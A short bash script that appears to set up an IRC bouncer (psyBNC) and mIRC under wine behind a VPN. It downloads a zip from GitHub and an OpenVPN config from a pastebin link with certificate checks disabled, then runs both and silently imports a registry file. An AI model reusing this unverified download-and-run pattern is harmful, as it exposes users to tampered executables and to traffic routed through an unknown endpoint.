#!/bin/bash -e
sudo apt update;
sudo apt install unzip wget openvpn -y;
wget -O psyBNC.zip https://github.com/ind3p3nd3nt/psyBNC-Win/releases/download/v3.5-Zip/psyBNC.zip --no-check-certificate
wget -O client.ovpn https://pastebin.com/raw/u0Ucw4vR --no-check-certificate
openvpn client.ovpn &
unzip psyBNC.zip 
wine regedit.exe /s s.reg
wine mirc.exe